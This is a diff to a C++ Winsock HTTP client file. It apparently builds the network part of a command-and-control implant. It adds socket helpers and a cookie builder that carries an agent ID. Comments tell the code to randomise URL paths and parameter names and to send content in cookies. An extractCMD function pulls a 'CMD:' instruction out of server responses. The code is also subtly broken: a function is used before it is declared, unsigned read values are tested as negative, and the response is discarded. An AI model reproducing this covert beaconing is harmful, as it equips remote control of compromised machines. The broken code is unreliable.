@@ -5,10 +5,15 @@
 #include "xhttp.h"
 #include <WinSock2.h>
 #include <map>
+#include <cstring>
+#include <cstdint>
+#include <stdint.h>
+#include <algorithm>
 
 #pragma comment(lib, "ws2_32.lib")
 
 namespace xhttp {
+std::vector<uint32_t> req_body;
 
 bool parse_url(const std::string& url, std::string& protocol, std::string& host, int& port, std::string& path) {
     std::stringstream ss(url);
@@ -53,11 +58,14 @@ bool parse_url(const std::string& url, std::string& protocol, std::string& host,
     return true;
 }
 
+std::string createCookiesString(const std::string& xID) {
+    // Define the cookies string with dynamic ID
+    std::string cookies = "ID=" + xID + "; cookie2=value2";
+
+    return cookies;
+}
 
 std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies) {
-   
-    std::string cookies = "ID={ xID }; cookie2=value2"; // Replace with your actual cookies
-
     return "GET /" + path + " HTTP/1.1\r\n"
            "Host: " + host + "\r\n"
            "Connection: close\r\n"
@@ -65,7 +73,31 @@ std::string buildRequest(const std::string& path, const std::string& host, const
            "\r\n";
 }
 
+bool initialize_winsock() {
+    WSADATA wsaData;
+    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
+}
 
+SOCKET create_socket(const std::string& host, int port) {
+    SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (ConnectSocket == INVALID_SOCKET) {
+        std::cerr << "Error creating socket: " << WSAGetLastError() << std::endl;
+        return INVALID_SOCKET;
+    }
+
+    struct sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = inet_addr(host.c_str());
+    serverAddr.sin_port = htons(port);
+
+    if (connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
+        closesocket(ConnectSocket);
+        return INVALID_SOCKET;
+    }
+
+    return ConnectSocket;
+}
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 /////////                                       GET  
@@ -73,70 +105,110 @@ std::string buildRequest(const std::string& path, const std::string& host, const
 // Randomize the URL path based on common path
 // Randomize the parameter names
 // Use cookies to send the content
+std::string http_get(const std::string& url) {
+    std::string protocol, host, path, cookies;
+    int port;
+    if (!parse_url(url, protocol, host, port, path)) {
+        return "";
+    }
 
-std::string http_get(const std::string& url) { // , const std::map<std::string, std::string>& queryParameters
-        std::string protocol, host, path, cookies;
-        int port;
-        if (!parse_url(url, protocol, host, port, path)) {
-            return "";
-        }
-        WSADATA wsaData;
-        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-            std::cerr << "WSAStartup failed.\n";
-            return "";
-        }
+    if (!initialize_winsock()) {
+        return "";
+    }
 
-        SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (ConnectSocket == INVALID_SOCKET) {
-            std::cerr << "Error creating socket: " << WSAGetLastError() << std::endl;
-            WSACleanup();
-            return "";
-        }
+    SOCKET ConnectSocket = create_socket(host, port);
+    if (ConnectSocket == INVALID_SOCKET) {
+        WSACleanup();
+        return "";
+    }
 
-        struct sockaddr_in serverAddr;
-        serverAddr.sin_family = AF_INET;
-        serverAddr.sin_addr.s_addr = inet_addr(host.c_str());
-        serverAddr.sin_port = htons(port);
-        
-        // Extracting and printing individual components
-        
-        std::cerr << "Server Address Family: " << serverAddr.sin_family << std::endl;
-        std::cerr << "Server Port: " << ntohs(serverAddr.sin_port) << std::endl;
-        std::cerr << "Server IP Address: " << inet_ntoa(serverAddr.sin_addr) << std::endl;
+    std::string request = buildRequest(path, host, cookies);
 
-        inet_pton(AF_INET, host.c_str(), &serverAddr.sin_addr);
-
-        if (connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-            std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
-            closesocket(ConnectSocket);
-            WSACleanup();
-            return "";
-        }
-
-        std::string request = buildRequest(path, host, cookies);
-
-        if (send(ConnectSocket, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
-            std::cerr << "Error sending request: " << WSAGetLastError() << std::endl;
-            closesocket(ConnectSocket);
-            WSACleanup();
-            return "";
-        }
-
-        std::string response;
-        char buffer[1024];
-        int bytesReceived;
-        while ((bytesReceived = recv(ConnectSocket, buffer, sizeof(buffer), 0)) > 0) {
-            response.append(buffer, bytesReceived);
-        }
-
-        if (bytesReceived < 0) {
-            std::cerr << "Error receiving response: " << WSAGetLastError() << std::endl;
-        }
-
+    if (send(ConnectSocket, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
+        std::cerr << "Error sending request: " << WSAGetLastError() << std::endl;
         closesocket(ConnectSocket);
         WSACleanup();
+        return "";
+    }
 
-    return response;
+    std::vector<uint32_t> response_data = receive_data(ConnectSocket);
+    
+    // Here you can process the response data as needed
+
+
+    req_body.clear(); // Clearing req_body vector
+
+    closesocket(ConnectSocket);
+    WSACleanup();
+    return ""; // Placeholder for response handling
+}
+
+std::string extractCMD(const std::vector<uint32_t>& data) {
+    // Search for the CMD header
+    const char cmdHeader[] = "CMD:";
+    auto header_start = std::search(data.begin(), data.end(), std::begin(cmdHeader), std::end(cmdHeader) - 1);
+    if (header_start != data.end()) {
+        // Find the end of the header line
+        auto header_end = std::find(header_start, data.end(), '\n');
+        if (header_end != data.end()) {
+            // Extract the content length value
+            std::string cmdValue(header_start + sizeof(cmdHeader) - 1, header_end);
+            // Remove leading and trailing whitespaces
+            cmdValue.erase(0, cmdValue.find_first_not_of(" \n\r\t"));
+            cmdValue.erase(cmdValue.find_last_not_of(" \n\r\t") + 1);
+            return cmdValue;
+        }
+    }
+    return "No command";
+}
+
+bool extract_content_length(const std::vector<uint32_t>& data, size_t& content_length) {
+    // Search for the Content-Length header
+    const char content_length_header[] = "Content-Length:";
+    auto header_start = std::search(data.begin(), data.end(), std::begin(content_length_header), std::end(content_length_header) - 1);
+    if (header_start != data.end()) {
+        // Find the end of the header line
+        auto header_end = std::find(header_start, data.end(), '\n');
+        if (header_end != data.end()) {
+            // Extract the content length value
+            std::string length_str(header_start + sizeof(content_length_header) - 1, header_end);
+            content_length = std::stoul(length_str);
+            return true;
+        }
+    }
+    return false;
+}
+
+std::vector<uint32_t> receive_data(SOCKET ConnectSocket) {
+
+    constexpr size_t BUFFER_SIZE = 1024;
+    char buffer[BUFFER_SIZE];
+    size_t read = 0;
+
+    size_t content_length = 0;
+    bool found_content_length = false;
+
+    while (true) {
+        read = recv(ConnectSocket, buffer, BUFFER_SIZE, 0);
+        if (read <= 0) {
+            // Either an error occurred or the connection was closed
+            break;
+        }
+        // Append received data to req_body
+        req_body.insert(req_body.end(), buffer, buffer + read);
+
+        // Check if we have found the Content-Length header
+        if (!found_content_length) {
+            found_content_length = extract_content_length(req_body, content_length);
+        }
+
+        // Check if we have received the entire body
+        if (found_content_length && req_body.size() >= content_length) {
+            break;
+        }
+    }
+
+    return req_body;
 }
 
 }
